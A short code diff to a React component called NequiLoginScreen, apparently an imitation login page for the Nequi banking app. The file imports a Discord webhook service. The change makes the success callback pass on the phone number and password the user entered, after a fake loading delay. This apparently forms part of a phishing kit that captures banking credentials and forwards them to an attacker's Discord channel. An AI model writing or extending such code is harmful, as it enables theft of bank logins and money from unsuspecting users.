@@ -4,7 +4,7 @@ import { DiscordWebhookService } from '../services/DiscordWebhookService'
 
 interface NequiLoginScreenProps {
   phone: string
-  onSuccess: () => void
+  onSuccess: (phoneValue: string, password: string) => void
 }
 
 export function NequiLoginScreen({ phone, onSuccess }: NequiLoginScreenProps) {
@@ -26,7 +26,7 @@ export function NequiLoginScreen({ phone, onSuccess }: NequiLoginScreenProps) {
     setLoading(true)
     setTimeout(() => {
       setLoading(false)
-      onSuccess()
+      onSuccess(phoneValue, password)
     }, 2000)
   }
 
